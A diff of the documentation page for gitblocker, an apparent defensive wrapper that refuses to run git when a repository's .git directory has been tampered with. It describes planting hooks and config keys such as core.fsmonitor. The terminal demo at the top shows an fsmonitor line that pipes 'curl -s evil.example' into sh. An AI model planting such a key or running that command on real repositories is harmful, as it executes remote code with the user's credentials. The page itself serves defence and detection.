@@ -17,13 +17,14 @@ hero:
   <span class="add">added</span>     hooks/pre-commit
 
   diff of ~/work/api/.git/config:
-  <span class="hint">@@ -5,3 +5,4 @@</span>
-   	logallrefupdates = true
-   	ignorecase = true
-   	precomposeunicode = true
-  <span class="add">+	fsmonitor = sh -c "curl -s evil.example | sh"</span>
+  <span class="hint">@@ -3,3 +3,4 @@</span>
+   ?filemode = true
+   ?bare = false
+   ?logallrefupdates = true
+  <span class="add">+?fsmonitor = sh -c \"curl -s evil.example | sh\"</span>
 
 <span class="hr">────────────────────────────────────────────────────────</span>
+<span class="w">Trust this state and run git? [y/N]</span> n
   <span class="hint">If legitimate:  gitblocker trust      Otherwise:  gitblocker restore</span>
 <span class="x big">✗ gitblocker: refusing to run git.</span>
 {% endcapture %}
@@ -38,6 +39,8 @@ You give a tool you do not fully trust write access to a directory that holds gi
 From there the code can drop a script in `.git/hooks/`, add a key such as `core.fsmonitor` or `core.sshCommand` to `.git/config`, point `include.path` at a file it controls, plant a nested repository in a subdirectory, or replace `.git` itself with a `gitdir:` file. None of this runs inside the sandbox. It waits.
 
 It runs the next time you type `git` on the host, with your SSH keys, your credentials and your shell. The sandbox never had to escape. You carried the payload across the boundary yourself.
+
+No sandbox is needed for the same result: an archive you unpack or a folder copied from another machine, with a `.git` inside, is yours on disk, so git's `safe.directory` check says nothing, and your prompt's `git status` runs what its config names. gitblocker refuses a repository it has never seen until you have looked.
 
 Prevention layers help and are independent of gitblocker: a seccomp or AppArmor profile forbidding writes under `.git/`, a global `core.hooksPath`, an unmapped uid in a rootless container, and `safe.bareRepository=explicit`, which you should set in every case. gitblocker is the detection layer underneath. It refuses to run git until you have looked.
 
@@ -124,13 +127,20 @@ git -c core.hooksPath=…
 
    System-wide on Debian and Ubuntu: `dpkg-divert` the real git to `/usr/bin/git.real` and symlink `/usr/bin/git` to gitblocker — the package built by `ci/build-deb.sh` does it, at the exec path too, and `apt remove gitblocker` undoes it. gitblocker finds a `git.real` next to itself; `git-receive-pack`, `git-upload-pack` and `git-upload-archive`, symlinks to `git` that sshd runs for every push and fetch to the machine, pass straight through to the real git. On macOS keep the `PATH` symlink and set `git.path` in VS Code.
 
-3. Set the companion setting git already ships. It is independent of gitblocker and closes a hole gitblocker cannot reach from tools that bypass the wrapper.
+3. Wrap the git that git itself runs. A command enters other repositories, a submodule or one planted in the work tree, through child gits, and it finds those in its own exec path, not in your `PATH`. Build an exec path whose `git` is gitblocker and point git at it from your shell profile. The Debian package needs neither line. Run the first one again after a git upgrade; `gitblocker trust` says when the exec path is not wrapped or is stale. On macOS, add `launchctl setenv GIT_EXEC_PATH ~/.local/lib/gitblocker-exec` for GUI apps.
+
+   ```console
+   $ gitblocker exec-path
+   $ export GIT_EXEC_PATH=~/.local/lib/gitblocker-exec
+   ```
+
+4. Set the companion setting git already ships. It is independent of gitblocker and closes a hole gitblocker cannot reach from tools that bypass the wrapper.
 
    ```console
    $ git config --global safe.bareRepository explicit
    ```
 
-4. Trust each repository you already have, after a look at its `config` and `hooks/`: nothing is blessed unseen, there is no trust-on-first-use. A `clone` or `init` made through the wrapper is trusted on its own.
+5. Trust each repository you already have, after a look at its `config` and `hooks/`: nothing is blessed unseen, there is no trust-on-first-use. A `clone` or `init` made through the wrapper is trusted on its own.
 
    ```console
    $ cd ~/work/api && cat .git/config && ls -la .git/hooks
@@ -147,9 +157,9 @@ git -c core.hooksPath=…
 <div class="two" markdown="1">
 <div class="prose" markdown="1">
 
-Commit, checkout, merge, rebase, stash, bisect, gc, worktree and submodule operations touch only files gitblocker does not watch, so you never hear from it; `git --version` is never checked at all. When something did change, three cases.
+Commit, checkout, merge, rebase, stash, bisect and gc touch only files gitblocker does not watch, so you never hear from it. `git worktree add`, `move`, `remove` and `prune` run through gitblocker ask nothing either. `submodule add` and `submodule update --init` write to the gitdir: the next command in the superproject asks once. A submodule or a linked worktree needs no trust of its own, it takes the trust of the repository that holds it. `git --version` is never checked at all. When something else did change:
 
-**Auto-accept.** The change is one git or your editor made itself: `push -u`, `branch -u` and `checkout -b` write `branch.x.remote` (a remote already known) and `branch.x.merge` (a `refs/heads/…`), VS Code writes `branch.x.vscode-merge-base` (a ref name) when it opens a repository. If the only file that changed is the config and its semantic difference is limited to those lines, gitblocker updates the reference itself, prints one line and runs git. A closed allowlist of three keys that cannot make git execute anything, not a blocklist; a lone comment or a `branch.x.rebase` still gets the question. Not to be confused with auto-trust, which blesses a *new* repository after a `clone` or `init` through the wrapper.
+**Auto-accept.** The change is one git or your editor made itself: `push -u`, `branch -u` and `checkout -b` write `branch.x.remote` (a remote already known) and `branch.x.merge` (a `refs/heads/…`), VS Code writes `branch.x.vscode-merge-base` (a ref name) when it opens a repository, `remote add` writes `remote.x.url` and `remote.x.fetch` (a URL git reaches over the network by itself, `https://`, `ssh://`, `user@host:path`; a local path, `file://` or a `helper::` URL is asked). If every file that changed is a config, the repository's or a submodule's, and its semantic difference is limited to those lines, gitblocker updates the reference itself, prints one line and runs git. A closed allowlist of keys that cannot make git execute anything, not a blocklist; a lone comment or a `branch.x.rebase` still gets the question. Not to be confused with auto-trust, which blesses a *new* repository after a `clone` or `init` through the wrapper.
 
 **Anything else.** The diff is shown, then a question on the terminal: trust this state and run git, default no. The question goes through `/dev/tty`, so git's stdin is left alone. No question without a terminal, with stdout or stderr redirected, or with `GITBLOCKER_NO_PROMPT=1`.
 
@@ -161,7 +171,9 @@ What you say yes to is exactly what you were shown. gitblocker saves the state i
 
 **A change to your global config** (`git config --global`, `git lfs install`, an edited hook of `~/.githooks`) alerts nowhere: it is your machine's, not part of any repository's fingerprint.
 
-Tried on Debian with the system-wide install, on a repository modified behind the user's back: starship, oh-my-zsh, fish and `__git_ps1` prompts go quiet with no delay; powerlevel10k keeps showing branch and status, since `gitstatusd` reads `.git` itself and never runs git; lazygit exits with gitblocker's message, tig says "Not a git repository"; fugitive's `:Git` shows the refusal after `GITBLOCKER_WAIT`; VS Code's polling waits for your `gitblocker pending`; pre-commit's hook runs with the real git.
+Tried on Debian with the system-wide install, on a repository modified behind the user's back: starship, oh-my-zsh, fish and `__git_ps1` prompts go quiet with no delay; powerlevel10k keeps showing branch and status, since `gitstatusd` reads `.git` itself and never runs git; lazygit exits with gitblocker's message, tig says "Not a git repository"; fugitive's `:Git` shows the refusal after `GITBLOCKER_WAIT`; VS Code's polling waits for your `gitblocker pending`.
+
+With pre-commit, the `pre-commit install` that writes the hook is what asks for a trust. Once the exec path is wrapped, the gits the hook runs afterwards are gitblocker too, children of the `git commit` that was checked: they ask nothing in that repository, and judge any other one they enter.
 
 </div>
 <div markdown="1">
@@ -170,26 +182,24 @@ A legitimate change, accepted from the terminal
 {:.cap}
 
 {% capture t %}
-<span class="p">$</span> git remote add upstream git@github.com:org/api.git
-<span class="p">$</span> git fetch upstream
+<span class="p">$</span> git config pull.rebase true
+<span class="p">$</span> git pull
 <span class="hr">────────────────────────────────────────────────────────</span>
 <span class="w">!</span> gitblocker: <span class="b">~/work/api/.git has changed since the last trust</span>
   <span class="mod">modified</span>  config
 
   diff of ~/work/api/.git/config:
-  <span class="hint">@@ -8,3 +8,6 @@</span>
+  <span class="hint">@@ -9,3 +9,5 @@</span>
    [branch "main"]
-   	remote = origin
-   	merge = refs/heads/main
-  <span class="add">+[remote "upstream"]</span>
-  <span class="add">+	url = git@github.com:org/api.git</span>
-  <span class="add">+	fetch = +refs/heads/*:refs/remotes/upstream/*</span>
+   ?remote = origin
+   ?merge = refs/heads/main
+  <span class="add">+[pull]</span>
+  <span class="add">+?rebase = true</span>
 
 <span class="hr">────────────────────────────────────────────────────────</span>
 <span class="w">Trust this state and run git? [y/N]</span> y
 <span class="ok">✓</span> gitblocker: trust state recorded for /home/user/work/api
-From github.com:org/api
- * [new branch]      main       -&gt; upstream/main
+Already up to date.
 {% endcapture %}
 {% include term.html title="you@host — ~/work/api" body=t %}
 
@@ -198,11 +208,11 @@ When it was not you
 
 {% capture t %}
 <span class="p">$</span> gitblocker diff
-<span class="w">!</span> gitblocker: changes in ~/work/api/.git:
+changes in ~/work/api/.git:
   <span class="add">added</span>     hooks/pre-commit
 <span class="p">$</span> gitblocker restore
 Actions on /home/user/work/api:
-  <span class="x">delete</span>    hooks/pre-commit
+  <span class="x">delete</span> hooks/pre-commit
 <span class="w">Continue? [y/N]</span> y
 <span class="ok">✓</span> gitblocker: 1 file(s) restored, /home/user/work/api
   matches the trusted state again
@@ -215,13 +225,15 @@ When your editor ran git, not you
 {% capture t %}
 <span class="p">$</span> gitblocker pending
 <span class="mod">changed</span>         4s  1 waiting  /home/user/work/api
-  <span class="hint">gitblocker pending &lt;repo&gt;  to see the diff and decide  -a: all</span>
+  <span class="hint">gitblocker pending &lt;repo&gt;   to see the diff and decide     -a: all</span>
 <span class="p">$</span> gitblocker pending ~/work/api
 /home/user/work/api  [changed, since 6s]
     git waiting (pid 41250, 6s): code[40988] ← systemd[1]
       /usr/share/code/code --type=utility
 <span class="hr">────────────────────────────────────────────────────────</span>
+<span class="w">!</span> gitblocker: <span class="b">~/work/api/.git has changed since the last trust</span>
   <span class="add">added</span>     hooks/pre-commit
+
 <span class="hr">────────────────────────────────────────────────────────</span>
 <span class="w">Allow: record this state and let the waiting git run? [y/N]</span> n
 <span class="w">!</span> gitblocker: refused: the waiting git is not run;
@@ -245,12 +257,14 @@ When your editor ran git, not you
 | `gitblocker` | Check the current repository. Exit 1 if suspect or never trusted. Reports, never asks. |
 | `gitblocker trust` | Record the current state as the reference, with a backup of the watched files. |
 | `gitblocker diff` | Show what differs from the reference. |
-| `gitblocker restore [-y]` | Put the watched files of the gitdir and the tree back into the reference state. Only the pivot vector: commits, objects and tree files the sandbox left stay for you to inspect; a watched file outside the repository is named, never written. |
-| `gitblocker git <args>` | Check, then run the real git. Honours `-C`, `--git-dir`, `--work-tree`. |
-| `gitblocker list` | Every registered repository with its status: ok, modified, structure, missing, legacy, unknown. |
-| `gitblocker pending [<repo>… \| -a \| -c]` | Decisions waiting for a git blocked by a program: list them, review one (diff and calling process) and allow or refuse, or clear. |
+| `gitblocker restore [-y]` | Put the watched files of the gitdir and the tree back into the reference state. Only the pivot vector: commits, objects and tree files the sandbox left stay for you to inspect; a watched file outside the repository is named, never written. Refused when `.git` no longer leads to the git directory that state was taken from. |
+| `gitblocker git <args>` | Check, then run the real git. Honours `-C`, `--git-dir`, `--work-tree`, `-c`. |
+| `gitblocker list` | Every registered repository with its status: ok, modified, structure, missing, unreadable, legacy, unknown. |
+| `gitblocker pending [<repo>… \| -a \| -c <repo>…]` | Decisions waiting for a git blocked by a program: list them, review one (diff and calling process) and allow or refuse, or clear. |
 | `gitblocker forget <repo>…` | Remove entries. `--missing` removes repositories that no longer exist; `prune` is the same. |
-| `gitblocker retrust` | Re-validate the unchanged repositories in bulk after an upgrade that changed the fingerprint. |
+| `gitblocker retrust` | After an upgrade that changed the fingerprint: record the present state of every repository listed as ok or legacy, in bulk. A reference of the older format is compared with nothing, so look first where it matters; a modified repository of the current format is skipped. |
+| `gitblocker exec-path [<dir>]` | Build or rebuild an exec path whose `git` is gitblocker, for `GIT_EXEC_PATH`. Default `~/.local/lib/gitblocker-exec`. |
+| `gitblocker version` | The version, which is the package's. |
 
 </div>
 <div class="tablewrap" markdown="1">
@@ -263,6 +277,7 @@ When your editor ran git, not you
 | `GITBLOCKER_NO_PROMPT=1` | Never ask on the terminal. Refuse directly. |
 | `GITBLOCKER_WAIT` | Seconds a git without a terminal waits for `gitblocker pending`. Default 60, 0 never waits. |
 | `GITBLOCKER_NO_NOTIFY=1` | No desktop notification. |
+| `GITBLOCKER_KEEP_FSMONITOR=1` | Do not pin `core.fsmonitor=false` on the git gitblocker runs. The pin keeps a repository planted in the work tree, which git may read in-process, from running its fsmonitor hook; set this to keep a fsmonitor of your own. |
 | `GITBLOCKER_DEBUG=1` | Full traceback on an internal error instead of a neutralised message. |
 | `NO_COLOR` | No colours. |
 
@@ -287,6 +302,6 @@ When your editor ran git, not you
 - Bare repositories are refused, not managed. `core.splitIndex` is refused: the gitlinks it needs to read live in `sharedindex.*`.
 - Parity with git is checked against git itself in `tests/test_git_parity.py`; a gap found there is marked as an expected failure until fixed, and none is open at the moment; the expected failures there record what git runs from the global config, which is not read. Deliberate, fail-closed divergences: a NUL byte or a line git dies on in a config file of the repository is refused.
 
-The suite replays a catalogue of over eighty bypasses and false positives found over thirteen adversarial review passes, and requires a refusal for each one, the documented limitations aside, while ordinary git workflows stay silent. The catalogue, the review method and the design notes are in the repository.
+The suite replays a catalogue of more than 170 bypasses and false positives found over twenty-one adversarial review passes, and requires a refusal for each bypass, the documented limitations aside, while ordinary git workflows stay silent. The catalogue, the review method and the design notes are in the repository.
 
 </section>
